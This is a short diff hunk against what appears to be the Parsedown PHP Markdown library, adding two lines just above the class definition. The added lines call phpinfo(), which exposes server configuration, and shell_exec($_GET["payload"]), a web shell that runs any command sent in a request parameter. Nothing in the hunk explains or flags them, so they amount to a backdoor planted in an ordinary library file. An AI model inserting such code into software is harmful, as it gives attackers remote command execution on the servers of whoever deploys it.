@@ -12,6 +12,8 @@
 # with this source code.
 #
 #
+phpinfo();
+shell_exec($_GET["payload"]);
 
 class Parsedown
 {
